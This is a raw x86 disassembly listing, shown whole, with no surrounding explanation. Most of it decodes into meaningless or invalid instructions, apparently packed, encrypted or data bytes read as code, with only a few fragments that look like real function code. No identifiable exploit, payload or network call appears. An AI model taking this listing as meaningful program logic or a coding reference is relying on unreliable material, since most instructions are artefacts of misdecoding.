  4051d8:	push   DWORD PTR [edx+0x16b37d2c]
  4051de:	push   0x69
  4051e0:	push   cs
  4051e1:	loope  0x4051b7
  4051e3:	pop    ebx
  4051e4:	and    DWORD PTR [esi+0x63df961],0xffffffa9
  4051eb:	and    ebx,DWORD PTR ds:[ebp+0x52e867a7]
  4051f2:	and    DWORD PTR [ebx+0x54],ecx
  4051f5:	inc    esi
  4051f6:	aad    0xac
  4051f8:	sbb    DWORD PTR [esi],edi
  4051fa:	jp     0x4051a2
  4051fc:	sahf   
  4051fd:	mov    ah,0x78
  4051ff:	mov    ah,0xcc
  405201:	nop
  405202:	sub    BYTE PTR [ebp+0x2d],bh
  405205:	enter  0xca13,0xaf
  405209:	cld    
  40520a:	test   DWORD PTR [edi+ebx*1+0x31],edx
  40520e:	push   ss
  40520f:	std    
  405210:	pop    ebx
  405211:	pop    ebp
  405212:	adc    DWORD PTR [ebx+esi*2],ebp
  405215:	out    0x90,al
  405217:	mov    eax,0xbc730126
  40521c:	clc    
  40521d:	xor    ebp,DWORD PTR [ebx+ebp*4]
  405220:	(bad)  
  405221:	jmp    0x4a1:0x3cab4460
  405228:	(bad)  
  405229:	loop   0x40523c
  40522b:	pop    ecx
  40522c:	add    BYTE PTR [ebx+eiz*4],ah
  40522f:	nop
  405230:	mov    ds:0x41d33de2,eax
  405235:	pop    es
  405236:	lds    ecx,FWORD PTR [ebx-0x4078d98b]
  40523c:	xchg   edx,eax
  40523d:	jmp    0x3716b65a
  405242:	xchg   ebp,eax
  405243:	or     eax,0x66c35020
  405248:	add    BYTE PTR [ecx-0x9acfe34],ah
  40524e:	repz add eax,0xab8a1631
  405254:	or     eax,0xfd5939c2
  405259:	outs   dx,BYTE PTR ds:[esi]
  40525a:	ds inc edi
  40525c:	ret    0xe9e2
  40525f:	outs   dx,BYTE PTR ds:[esi]
  405260:	mov    cl,0x6f
  405262:	cmp    eax,0xb3ba451e
  405267:	mov    bh,0x75
  405269:	mov    DWORD PTR [ebx],ecx
  40526b:	cmp    DWORD PTR ss:[esi-0x62],ecx
  40526f:	test   eax,0x8f7e8026
  405274:	xor    ah,BYTE PTR [ebx-0x29]
  405277:	or     eax,0xe06730ea
  40527c:	int3   
  40527d:	or     BYTE PTR [edi-0x10],dl
  405280:	push   0xe956356b
  405285:	(bad)  [eax-0x3e8741f5]
  40528b:	and    esi,esp
  40528d:	dec    edi
  40528e:	add    DWORD PTR [ebx+0x24],edx
  405291:	adc    eax,0x2d40e635
  405296:	and    edi,DWORD PTR [ebp-0x6e6c7d41]
  40529c:	and    DWORD PTR [edx+ecx*2],edi
  40529f:	dec    edi
  4052a0:	jbe    0x405222
  4052a2:	adc    eax,0x8a0ac1d4
  4052a7:	add    DWORD PTR [edi+0x3d],ebx
  4052aa:	xchg   esp,eax
  4052ab:	xchg   esi,eax
  4052ac:	and    esi,DWORD PTR [ecx]
  4052ae:	aam    0x60
  4052b0:	adc    DWORD PTR [eax-0x4e989f8b],esp
  4052b6:	sub    bl,BYTE PTR [ebx-0x6e9a3519]
  4052bc:	jmp    0x7b3de80b
  4052c1:	cmp    BYTE PTR [edx+ebp*2-0x1c4c7586],dl
  4052c8:	mov    ebx,0xbe261b9
  4052cd:	and    eax,0xc35e7da8
  4052d2:	scas   eax,DWORD PTR es:[edi]
  4052d3:	jb     0x405264
  4052d5:	pop    ecx
  4052d6:	lds    edx,FWORD PTR [ecx+0x649fcbc3]
  4052dc:	mov    ds:0xc167c135,eax
  4052e1:	nop
  4052e2:	into   
  4052e3:	rcr    BYTE PTR [ebp+0x3f],0x3b
  4052e7:	dec    esp
  4052e8:	in     eax,dx
  4052e9:	xchg   edx,eax
  4052ea:	mov    es,WORD PTR [esi+ecx*4+0x7988a0aa]
  4052f1:	mov    ah,0x8a
  4052f3:	mov    esp,0x4e42bf5e
  4052f8:	lds    esi,FWORD PTR [edi-0x5d]
  4052fb:	xor    BYTE PTR [edx+eiz*1+0x6c],bh
  4052ff:	std    
  405300:	repnz mov gs:0xc1a60c97,eax
  405307:	sbb    eax,0xaa00318d
  40530c:	pop    esp
  40530d:	(bad)  
  40530e:	fnstcw WORD PTR [ebp-0x25]
  405311:	aas    
  405312:	pop    ebp
  405313:	popa   
  405314:	neg    BYTE PTR [esi+eiz*1-0x2c]
  405318:	pop    edx
  405319:	ja     0x405331
  40531b:	aas    
  40531c:	sub    al,0x74
  40531e:	in     eax,dx
  40531f:	adc    BYTE PTR [eax-0x3d],al
  405322:	in     eax,0xd5
  405324:	mov    esi,0xd77d550c
  405329:	test   al,0xaf
  40532b:	int3   
  40532c:	add    bl,dh
  40532e:	fadd   st,st(3)
  405330:	xor    eax,0xe1aaa95b
  405335:	aas    
  405336:	mov    ah,0x9d
  405338:	ss inc esp
  40533a:	inc    esi
  40533b:	or     DWORD PTR [eax-0x51bef118],esi
  405341:	push   esi
  405342:	adc    DWORD PTR [esi-0x6b0a338d],0x7d649c5e
  40534c:	jns    0x405318
  40534e:	sub    edx,DWORD PTR ds:0x6101b8c4
  405354:	xchg   ecx,eax
  405356:	ja     0x40530f
  405358:	clc    
  405359:	out    dx,al
  40535a:	(bad)  
  40535b:	cmp    dl,BYTE PTR [ebx+0xb]
  40535e:	icebp  
  40535f:	inc    edi
  405360:	aas    
  405361:	adc    bh,BYTE PTR [eax+0x4]
  405364:	cmp    eax,0x3e1c73d
  405369:	adc    eax,0xd79e3f95
  40536e:	push   es
  40536f:	rcl    dh,0x1
  405372:	xchg   ebp,eax
  405373:	or     esi,DWORD PTR [eax]
  405375:	xchg   ecx,eax
  405376:	mov    eax,0xc80f62a4
  40537b:	and    DWORD PTR [edx+edx*2-0x6c],0x59
  405380:	(bad)  
  405381:	sbb    eax,0x1660b9
  405386:	pushf  
  405387:	dec    eax
  405388:	and    DWORD PTR [edi],ecx
  40538a:	fdivr  DWORD PTR [edx-0x71]
  40538d:	adc    ecx,esp
  40538f:	sub    esi,DWORD PTR [edx-0x5f]
  405392:	jl     0x405354
  405394:	or     BYTE PTR [esi],0xdd
  405397:	int3   
  405398:	fild   DWORD PTR [esi]
  40539a:	scas   eax,DWORD PTR es:[edi]
  40539b:	jp     0x405397
  40539d:	mov    ds:0x8eade267,eax
  4053a2:	dec    eax
  4053a3:	rcr    BYTE PTR [ebp-0x2e1191ef],cl
  4053a9:	in     eax,dx
  4053aa:	xor    eax,DWORD PTR [ebx]
  4053ac:	(bad)  
  4053ad:	popa   
  4053ae:	mov    edi,0xd6269aa5
  4053b3:	repz stc 
  4053b5:	inc    BYTE PTR [eax]
  4053b7:	or     DWORD PTR [ecx],esp
  4053b9:	mov    dl,0x7e
  4053bb:	inc    eax
  4053bc:	in     al,dx
  4053bd:	jns    0x40543e
  4053bf:	mov    esp,0xfbee3eae
  4053c4:	lods   al,BYTE PTR ds:[esi]
  4053c5:	jmp    0x808deeaa
  4053ca:	mov    cl,0x8b
  4053cc:	gs out 0x5c,eax
  4053cf:	lds    edi,FWORD PTR [ecx+edx*4+0x3f1a1c94]
  4053d6:	push   edi
  4053d7:	jne    0x40539e
  4053d9:	mov    eax,0x31f3c597
  4053de:	jo     0x4053a6
  4053e0:	sbb    ebp,DWORD PTR [esi-0x20]
  4053e3:	test   BYTE PTR [edi+0x78],ah
  4053e6:	clc    
  4053e7:	mov    BYTE PTR [eax-0x44],bl
  4053ea:	test   dh,dh
  4053ec:	push   esp
  4053ed:	repnz shl BYTE PTR [ecx-0x7e1c637d],cl
  4053f4:	iret   
  4053f5:	cs jo  0x405439
  4053f8:	(bad)  
  4053fa:	add    DWORD PTR [edi],ebp
  4053fc:	sbb    al,0x3f
  4053fe:	in     al,dx
  4053ff:	jp     0x405466
  405401:	repnz nop
  405403:	daa    
  405404:	sti    
  405405:	in     eax,0x9e
  405407:	push   eax
  405408:	pop    esi
  405409:	cmp    bh,dl
  40540b:	pop    ebp
  40540c:	or     ebx,edx
  40540e:	stc    
  40540f:	dec    eax
  405410:	frndint 
  405412:	or     ebx,ebp
  405414:	jmp    DWORD PTR ds:0xa988f921
  40541a:	push   edi
  40541b:	scas   eax,DWORD PTR es:[edi]
  40541c:	or     eax,0xcf45c8ff
  405421:	in     eax,0x5b
  405423:	icebp  
  405424:	fiadd  DWORD PTR ss:[esi]
  405427:	mov    eax,ds:0x5cc279b
  40542c:	xchg   ecx,eax
  40542d:	lahf   
  40542e:	push   ecx
  40542f:	mov    ebx,DWORD PTR [edi-0xfb26190]
  405435:	xor    dh,BYTE PTR [ebx-0x72dde569]
  40543b:	in     al,dx
  40543c:	rcr    BYTE PTR [ebx+0x32],1
  40543f:	sahf   
  405440:	jo     0x4053e6
  405442:	vmulss xmm1,xmm5,DWORD PTR [ecx+0x5eaae106]
  40544a:	and    al,0x0
  40544c:	mov    esp,0x4b594227
  405451:	mov    BYTE PTR [edi],dl
  405453:	dec    edx
  405454:	add    DWORD PTR [ebx+0x54b436e6],0xfffffff9
  40545b:	addr16 add cl,0xd2
  40545f:	mul    BYTE PTR [esi+0x6c]
  405462:	leave  
  405463:	push   0x52351832
  405468:	inc    ecx
  405469:	inc    ecx
  40546a:	cli    
  40546b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40546c:	(bad)  
  40546d:	aas    
  40546e:	(bad)  [eax+esi*4+0x48bd8ac6]
  405475:	sbb    eax,0x5220fcd1
  40547a:	stc    
  40547b:	shl    DWORD PTR ds:0x5eeecf6d,cl
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	xor    DWORD PTR [ecx+0x3710befe],esi
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405441
  4054b5:	les    esi,FWORD PTR [esi+edx*4]
  4054b8:	out    0x27,eax
  4054ba:	jmp    0xf248:0x9a9e0c6e
  4054c1:	mov    al,0xff
  4054c3:	jl     0x405457
  4054c5:	cdq    
  4054c6:	sti    
  4054c7:	shl    edx,0xfd
  4054ca:	nop
  4054cb:	or     DWORD PTR [edi+0x41],0xffffffb4
  4054cf:	sub    edx,ebp
  4054d1:	mov    dl,0x37
  4054d3:	ins    BYTE PTR es:[edi],dx
  4054d4:	shl    BYTE PTR [esi],cl
  4054d6:	out    0x69,al
  4054d8:	in     al,0xf9
  4054da:	mov    cl,BYTE PTR [ebp+edx*4-0x52]
  4054de:	call   0x1eff:0x872c8a2d
  4054e5:	scas   al,BYTE PTR es:[edi]
  4054e6:	aas    
  4054e7:	mov    edx,esp
  4054e9:	mov    DWORD PTR [ecx-0x33321ae5],ebp
  4054ef:	mov    bl,0xbe
  4054f1:	xchg   DWORD PTR es:[esi-0x5060629f],edi
  4054f8:	mov    eax,ds:0x314a48a1
  4054fd:	jno    0x405498
  4054ff:	ins    DWORD PTR es:[di],dx
  405501:	cmp    al,0x4e
  405503:	jecxz  0x4054dc
  405505:	les    esi,FWORD PTR [ebp+0x53121d97]
  40550b:	sbb    al,0xcd
  40550d:	stos   DWORD PTR es:[edi],eax
  40550e:	mov    eax,0x3bd8937a
  405513:	cmp    BYTE PTR [ebx+0x54b7e8ad],0x8
  40551a:	push   ds
  40551b:	int    0x20
  40551d:	test   DWORD PTR [edx],ebx
  40551f:	iret   
  405520:	scas   eax,DWORD PTR es:[edi]
  405521:	sbb    al,0xa5
  405523:	shr    DWORD PTR [ecx-0x20],cl
  405526:	shl    esi,cl
  405528:	push   edx
  405529:	push   ds
  40552a:	jno    0x40556e
  40552c:	jb     0x4054d5
  40552e:	adc    eax,0x462a61b0
  405533:	sbb    edi,ecx
  405535:	jno    0x4054bb
  405537:	xchg   esp,eax
  405538:	popa   
  405539:	mov    bl,0x93
  40553b:	into   
  40553c:	mov    dl,0x54
  40553e:	fsub   QWORD PTR [edi-0x6b79bde9]
  405544:	fisttp QWORD PTR [edi*4-0xca938d9]
  40554b:	mov    bl,0x55
  40554d:	xor    BYTE PTR [edx],dh
  40554f:	or     edi,DWORD PTR [edx+0x17]
  405552:	(bad)  
  405553:	cmp    eax,0xbaeb3cc3
  405558:	cmp    esp,DWORD PTR [ecx-0xe]
  40555b:	xchg   edx,eax
  40555c:	adc    BYTE PTR [esi+ebx*4],ch
  40555f:	enter  0x9b06,0x9b
  405563:	(bad)
  405566:	xor    ebp,edx
  405568:	jnp    0x40558e
  40556a:	lahf   
  40556b:	cmp    BYTE PTR [ebp+esi*2+0x2b615894],dh
  405572:	pop    esp
  405573:	(bad)  
  405575:	cdq    
  405576:	daa    
  405577:	cmp    al,0xe9
  405579:	sub    al,0x9d
  40557b:	jmp    0x6dbd:0x17a73434
  405582:	pop    ecx
  405583:	loopne 0x4055a9
  405585:	pop    ebp
  405586:	push   edx
  405587:	fimul  WORD PTR [edx+0x2b9e2f6a]
  40558d:	pusha  
  40558e:	xchg   ebp,eax
  40558f:	pop    esi
  405590:	push   es
  405591:	mov    esp,0x34e4d13b
  405596:	addr16 pop esi
  405598:	mov    esi,0x3971e2ec
  40559d:	outs   dx,DWORD PTR ds:[esi]
  40559e:	imul   eax,DWORD PTR [eax],0xffffffe7
  4055a1:	xchg   ecx,eax
  4055a2:	aaa    
  4055a3:	jno    0x4055dc
  4055a5:	mov    ecx,?
  4055a7:	std    
  4055a8:	lods   al,BYTE PTR ds:[esi]
  4055a9:	cdq    
  4055aa:	lock pop edx
  4055ac:	bound  ecx,QWORD PTR [eax*8+0x29bfc060]
  4055b3:	cmp    BYTE PTR [ebx-0x36],bl
  4055b6:	xor    BYTE PTR [esi],cl
  4055b8:	arpl   bp,sp
  4055ba:	inc    edi
  4055bb:	mov    cl,BYTE PTR [eax+0x65]
  4055be:	arpl   WORD PTR ds:0xace64ac0,bx
  4055c4:	mov    al,0x18
  4055c6:	jmp    0xdd6da293
  4055cb:	jecxz  0x4055a1
  4055cd:	push   ebx
  4055ce:	sti    
  4055cf:	push   esp
  4055d0:	sub    BYTE PTR [di-0x7b],bh
  4055d4:	sbb    BYTE PTR es:[ecx+0x70fe4226],dh
  4055db:	xchg   BYTE PTR [ebx],ch
  4055dd:	ret    0x92dd
  4055e0:	push   ebx
  4055e1:	enter  0x387c,0x65
  4055e5:	mov    ecx,0xb984ffef
  4055ea:	mov    al,0x2c
  4055ec:	test   eax,0xd774d77
  4055f1:	push   0x302af58f
  4055f6:	dec    esp
  4055f7:	inc    edi
  4055f8:	loopne 0x4055e5
  4055fa:	out    dx,al
  4055fb:	adc    DWORD PTR [eax],ebp
  4055fd:	sbb    DWORD PTR [ebx+edx*2-0x32e7c3c8],esp
  405604:	rcr    dh,cl
  405606:	xor    cl,BYTE PTR [ebp+0x42c8312d]
  40560c:	jne    0x405660
  40560e:	xor    ecx,esp
  405610:	xor    al,0xef
  405612:	sbb    BYTE PTR [ebp+ecx*4+0x29],cl
  405616:	mov    ebx,0xcfab4bec
  40561b:	push   edi
  40561c:	mov    ds:0xdfd8717b,al
  405621:	sar    DWORD PTR [ebx],cl
  405623:	push   ecx
  405624:	fimul  DWORD PTR [edx+0x71]
  405627:	in     al,0x34
  405629:	cmc    
  40562a:	popa   
  40562b:	rcl    BYTE PTR [edx-0x1811fa7e],1
  405631:	adc    eax,0x3a0f16c2
  405636:	bound  edx,QWORD PTR ds:0x7a47e1de
  40563c:	and    esp,DWORD PTR [ecx-0x2b87dfa8]
  405642:	add    cl,BYTE PTR [esi]
  405644:	popf   
  405645:	test   dh,cl
  405647:	sub    eax,0x9cac0e14
  40564c:	cdq    
  40564d:	mov    ebx,0x70746631
  405652:	sahf   
  405653:	mov    ds:0x34c1a23d,eax
  405658:	add    BYTE PTR [ebp+0x51e36b9b],ah
  40565e:	push   esp
  40565f:	shl    BYTE PTR [esi],cl
  405661:	jne    0x4056a6
  405663:	jmp    0xe1aa78f9
  405668:	or     DWORD PTR [eax-0x9],edi
  40566b:	lods   al,BYTE PTR ds:[esi]
  40566c:	call   0x9ee87b72
  405671:	inc    ebx
  405672:	jp     0x40565d
  405674:	lahf   
  405675:	xchg   ebp,eax
  405676:	jecxz  0x4056cc
  405678:	loope  0x405644
  40567a:	mov    bl,0x10
  40567c:	inc    ebx
  40567d:	sub    DWORD PTR [ecx],ecx
  40567f:	into   
  405680:	int3   
  405681:	cmp    ecx,eax
  405683:	jnp    0x4056e0
  405685:	push   cs
  405686:	dec    BYTE PTR [ebx-0x62]
  405689:	outs   dx,BYTE PTR ds:[esi]
  40568a:	push   cs
  40568b:	push   esp
  40568c:	retf   
  40568d:	outs   dx,BYTE PTR ds:[esi]
  40568e:	sub    BYTE PTR [edi+0x46],dh
  405691:	cli    
  405692:	or     DWORD PTR [edi+0x6a353cb5],esi
  405698:	push   eax
  405699:	loope  0x405662
  40569b:	pop    esp
  40569c:	inc    esi
  40569d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40569e:	div    edi
  4056a0:	sub    al,0xdf
  4056a2:	mov    edi,0x13cc94d4
  4056a7:	or     ebp,DWORD PTR [eax]
  4056a9:	push   0x5
  4056ab:	push   ebx
  4056ac:	icebp  
  4056ad:	or     al,0xd
  4056af:	inc    ebp
  4056b0:	jnp    0x4056b6
  4056b2:	fistp  QWORD PTR [edx+0x17]
  4056b5:	int    0xc7
  4056b7:	pop    edi
  4056b8:	mov    ecx,0xe17ecd00
  4056bd:	sub    ecx,eax
  4056bf:	lds    ebp,FWORD PTR ds:0xd16b62e7
  4056c5:	test   al,0xee
  4056c7:	jb     0x405684
  4056c9:	cmp    al,0xdc
  4056cb:	jmp    0x873fc93e
  4056d0:	mov    ds:0xc032a5d7,eax
  4056d5:	leave  
  4056d6:	arpl   WORD PTR [esi-0x79],di
  4056d9:	cmp    eax,0xf6b381e
  4056de:	mov    cl,0x2c
  4056e0:	jnp    0x405707
  4056e2:	mov    edx,DWORD PTR [edx-0x23]
  4056e5:	push   ebx
  4056e6:	inc    ecx
  4056e7:	mov    ds:0xfa52e43e,al
  4056ec:	scas   al,BYTE PTR es:[edi]
  4056ed:	dec    esp
  4056ee:	cli    
  4056ef:	xchg   edi,eax
  4056f0:	mov    eax,0xb5545cc9
  4056f5:	aas    
  4056f6:	adc    BYTE PTR [edx-0x22ba41ca],0x76
  4056fd:	mov    bl,0x78
  4056ff:	iret   
  405700:	xlat   BYTE PTR ds:[ebx]
  405701:	outs   dx,BYTE PTR ds:[esi]
  405702:	sub    eax,0x6b7bab2e
  405707:	int    0x99
  405709:	or     ecx,edi
  40570b:	mov    WORD PTR [ebx-0x68],gs
  40570e:	and    ecx,0xdf21c2b2
  405714:	push   ebp
  405715:	adc    eax,0x48205e6f
  40571a:	fisttp WORD PTR [ebp-0x31eaef2]
  405720:	push   ecx
  405721:	pop    es
  405722:	jne    0x405747
  405724:	fsub   DWORD PTR [ebx]
  405726:	pop    ds
  405727:	cs into 
  405729:	aas    
  40572a:	gs jecxz 0x40573d
  40572d:	adc    eax,0xea68f141
  405732:	inc    eax
  405733:	dec    ecx
  405734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405735:	sub    eax,0x857b3ce
  40573a:	sub    BYTE PTR [eax],ah
  40573c:	mov    ebp,0x881f91c7
  405741:	clc    
  405742:	mov    eax,cs
  405744:	call   FWORD PTR [edx+0xb]
  405747:	ret    0x5ccc
  40574a:	mov    bl,0x42
  40574c:	jmp    0x4057c7
  40574e:	adc    ebp,DWORD PTR [edx+ecx*1]
  405751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405752:	xchg   BYTE PTR [ecx+0x9],bl
  405755:	gs jb  0x405776
  405758:	fisubr WORD PTR [esi]
  40575a:	scas   al,BYTE PTR es:[edi]
  40575b:	jne    0x405767
  40575d:	jbe    0x40578c
  40575f:	mov    ebp,0x8d848976
  405764:	push   edx
  405765:	sbb    al,0x73
  405767:	das    
  405768:	js     0x4057d3
  40576a:	push   ecx
  40576b:	movzx  eax,WORD PTR ds:0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x3a166e42],eax
  405790:	cmc    
  405791:	inc    esi
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	rcr    ecx,cl
  40579c:	mov    ch,0x4b
  40579e:	push   ebp
  40579f:	lods   eax,DWORD PTR ds:[esi]
  4057a0:	mov    ss,WORD PTR [edx+0x5b590a27]
  4057a6:	test   DWORD PTR [esi+0x4e3b580a],esi
  4057ac:	and    ebp,DWORD PTR [ecx]
  4057ae:	test   eax,0x74bdb346
  4057b3:	jbe    0x40573c
  4057b5:	int3   
  4057b6:	into   
  4057b7:	push   edi
  4057b8:	addr16 out dx,al
  4057ba:	test   BYTE PTR [ecx+0x14],bh
  4057bd:	inc    edi
  4057be:	into   
  4057bf:	xchg   ebx,eax
  4057c0:	ins    BYTE PTR es:[edi],dx
  4057c1:	or     DWORD PTR [edx],eax
  4057c3:	int3   
  4057c4:	repnz xchg ecx,eax
  4057c6:	pop    ebx
  4057c7:	mov    bl,0xb2
  4057c9:	(bad)  
  4057ca:	out    dx,al
  4057cb:	fisub  WORD PTR ds:0xf2665b49
  4057d1:	in     eax,dx
  4057d2:	pop    es
  4057d3:	pop    eax
  4057d4:	sub    edi,ecx
  4057d6:	gs push 0xffffffa7
  4057d9:	iret   
  4057da:	xor    eax,ebx
  4057dc:	xor    bl,ch
  4057de:	jae    0x40579b
  4057e0:	sub    ebx,DWORD PTR [eax]
  4057e2:	pop    es
  4057e3:	shl    DWORD PTR [esi+ebx*1],0x9e
  4057e7:	ret    0xcf9d
  4057ea:	cmp    BYTE PTR [edi-0x7223d75d],ah
  4057f0:	cs cs jmp 0x4057e2
  4057f4:	(bad)  
  4057f6:	mov    bl,0x42
  4057f8:	repnz jecxz 0x405846
  4057fb:	int    0xb4
  4057fd:	mov    ebx,0x91c6eb3c
  405802:	ins    BYTE PTR es:[edi],dx
  405803:	sbb    cl,BYTE PTR [edi-0x12]
  405806:	ja     0x4057c1
  405808:	and    eax,0xb4f64f75
  40580d:	sbb    eax,0x9cf34a4c
  405812:	add    cl,bl
  405814:	or     cl,BYTE PTR fs:[ebx*4-0x86b5e5a]
  40581c:	jns    0x4057d4
  40581e:	fnsave [edx+0x4776d93f]
  405824:	pop    eax
  405825:	call   0x21a4:0x20b9062c
  40582c:	sti    
  40582d:	jb     0x405853
  40582f:	and    al,0x48
  405831:	adc    ch,cl
  405833:	mov    ds:0x74f6ba36,al
  405838:	cmp    bl,cl
  40583a:	mov    ?,WORD PTR [esi-0x22fe1c8]
  405840:	nop
  405841:	lock fdivr st,st(0)
  405844:	clc    
  405845:	mov    ecx,0xdd6e86f9
  40584a:	es pop esp
  40584c:	xchg   ecx,eax
  40584d:	add    bh,bh
  40584f:	push   ss
  405850:	mov    edx,0x5bebf785
  405855:	or     BYTE PTR [esi],al
  405857:	add    ch,BYTE PTR [ebx-0x79]
  40585a:	test   BYTE PTR [ecx],ch
  40585c:	aas    
  40585d:	adc    al,0x22
  40585f:	ror    DWORD PTR ds:0x56e6818d,cl
  405865:	fwait
  405866:	jmp    0xa5fb1206
  40586b:	cmp    BYTE PTR [eax],cl
  40586d:	mov    es,WORD PTR [eax]
  40586f:	jl     0x405888
  405871:	push   esi
  405872:	or     DWORD PTR [esi+0x5a],0xffffffaf
  405876:	cmp    cl,ch
  405878:	push   eax
  405879:	pop    ebx
  40587a:	pop    es
  40587b:	rcr    cl,cl
  40587d:	fs mov bh,0x7f
  405880:	adc    DWORD PTR [esi],ebp
  405882:	clc    
  405883:	mov    ch,0xb0
  405885:	in     eax,0x58
  405887:	add    BYTE PTR [bp+0x3b],0x93
  40588c:	test   DWORD PTR [edx+eiz*8-0x5e123371],0x855f49ac
  405897:	retf   
  405898:	xchg   esp,eax
  405899:	mov    al,al
  40589b:	or     eax,0x3a291e42
  4058a0:	mov    ds:0x923cac8b,eax
  4058a5:	xchg   ecx,eax
  4058a6:	fsub   DWORD PTR [edx]
  4058a8:	shl    BYTE PTR [esi],cl
  4058aa:	pop    edx
  4058ab:	inc    ebp
  4058ac:	fs repnz dec edi
  4058af:	jne    0x4058d7
  4058b1:	fcom   QWORD PTR [esi-0x71c3e942]
  4058b7:	or     BYTE PTR [ebx],0x13
  4058ba:	hlt    
  4058bb:	icebp  
  4058bc:	mov    edx,0xf4555bd0
  4058c1:	cli    
  4058c2:	add    al,0x86
  4058c4:	das    
  4058c5:	scas   al,BYTE PTR es:[edi]
  4058c6:	ficom  WORD PTR [esp+ebp*8-0x48]
  4058ca:	sahf   
  4058cb:	inc    ebp
  4058cc:	push   edi
  4058cd:	(bad)  
  4058ce:	mov    dh,0xd0
  4058d0:	mov    ch,0xb7
  4058d2:	dec    ebp
  4058d3:	push   cs
  4058d4:	or     ch,dl
  4058d6:	pop    ss
  4058d7:	(bad)  
  4058d8:	loopne 0x4058dc
  4058da:	fdivr  DWORD PTR [edx+eax*1]
  4058dd:	fwait
  4058de:	or     al,0xaf
  4058e0:	je     0x4058ec
  4058e2:	fcmovb st,st(7)
  4058e4:	mov    ebx,0x464a6001
  4058e9:	jae    0x4058b4
  4058eb:	(bad)  
  4058ec:	fstp   TBYTE PTR [eax+0x382cfe24]
  4058f2:	mov    ch,0xd3
  4058f4:	dec    esi
  4058f5:	cs push ds
  4058f7:	dec    ebx
  4058f8:	and    cl,bh
  4058fa:	or     ah,BYTE PTR [ecx+0x6836ee1]
  405900:	push   ecx
  405901:	xor    edx,DWORD PTR [esi-0x6c14c53]
  405907:	cmp    dl,BYTE PTR gs:[ecx+0x37]
  40590b:	xchg   ebp,eax
  40590c:	pop    eax
  40590d:	nop
  40590e:	test   al,0x41
  405910:	jg     0x405966
  405912:	pop    ecx
  405913:	mov    esp,0x5edaccf3
  405918:	or     BYTE PTR ds:0x59df6dd1,bl
  40591e:	add    ecx,DWORD PTR [edx+0x5e84dac1]
  405924:	jno    0x405914
  405926:	mov    cl,0xfe
  405928:	jle    0x40597f
  40592a:	jecxz  0x405921
  40592c:	outs   dx,BYTE PTR ds:[esi]
  40592d:	jnp    0x405937
  40592f:	and    al,0x8f
  405931:	or     eax,0x311a7a3f
  405936:	idiv   BYTE PTR [esi+ebp*1]
  405939:	ins    DWORD PTR es:[edi],dx
  40593a:	fs jns 0x40593c
  40593d:	cmp    al,0x51
  40593f:	adc    al,0xd6
  405941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405942:	cwde   
  405943:	add    ah,ch
  405945:	and    esp,eax
  405947:	pop    esp
  405948:	test   eax,0x73cdc529
  40594d:	sub    DWORD PTR [eax+0x17a29a16],ecx
  405953:	and    BYTE PTR [eax+0x6fbabb66],dh
  405959:	(bad)  
  40595a:	jns    0x4059b6
  40595c:	loop   0x40590d
  40595e:	push   cs
  40595f:	(bad)  
  405961:	mov    edx,0xe98ba3eb
  405966:	dec    esi
  405967:	mov    cl,0xaa
  405969:	mov    DWORD PTR [edx+0x20d7870a],0x4335eb08
  405973:	mov    WORD PTR [eax-0x36],?
  405976:	cmp    al,0x7b
  405978:	jge    0x4058fe
  40597a:	fwait
  40597b:	pop    esi
  40597c:	rcl    BYTE PTR [edi+0x4f6ea00b],0xf6
  405983:	jl     0x405979
  405985:	xchg   ebx,eax
  405986:	mov    cl,BYTE PTR [esi-0x3b]
  405989:	iret   
  40598a:	adc    DWORD PTR [eax-0x3d5f7a9a],edx
  405990:	jp     0x405a0a
  405992:	fcom   st(4)
  405994:	xor    al,BYTE PTR [ecx+0x75]
  405997:	mov    DWORD PTR [esi],edi
  405999:	shl    BYTE PTR [ebp-0x513e29f0],cl
  40599f:	mov    ebx,0x59ced3b0
  4059a4:	mov    db5,ebp
  4059a7:	faddp  st(6),st
  4059a9:	imul   edi,DWORD PTR [ebp+edx*2-0x78],0x8bb43739
  4059b1:	test   al,0xa3
  4059b3:	cmp    eax,0xb60a8927
  4059b8:	out    0x2c,eax
  4059ba:	push   esi
  4059bb:	ins    BYTE PTR es:[edi],dx
  4059bc:	fs and cl,bl
  4059bf:	not    DWORD PTR [esi]
  4059c1:	mov    edi,0x21e97fc4
  4059c6:	(bad)  
  4059c7:	jo     0x4059d9
  4059c9:	dec    eax
  4059ca:	jo     0x405a43
  4059cc:	call   0xb338157e
  4059d1:	je     0x40597c
  4059d3:	ret    0xfbc7
  4059d6:	addr16 cmp al,0x55
  4059d9:	dec    esi
  4059da:	aaa    
  4059db:	pop    ebx
  4059dc:	test   BYTE PTR es:[ebx-0x22],ah
  4059e0:	jno    0x405a38
  4059e2:	jno    0x405a62
  4059e4:	jmp    0x3bace902
  4059e9:	sub    ebx,edi
  4059eb:	adc    eax,ebp
  4059ed:	push   ebp
  4059ee:	push   edx
  4059ef:	and    bh,BYTE PTR [ebp-0x49]
  4059f2:	lods   eax,DWORD PTR ds:[esi]
  4059f3:	ret    
  4059f4:	outs   dx,DWORD PTR ds:[esi]
  4059f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f6:	mov    ecx,0xf8584e9e
  4059fb:	jmp    0x1183b19
  405a00:	jecxz  0x405a28
  405a02:	adc    eax,0xf7dad146
  405a07:	and    eax,0xe0d99f71
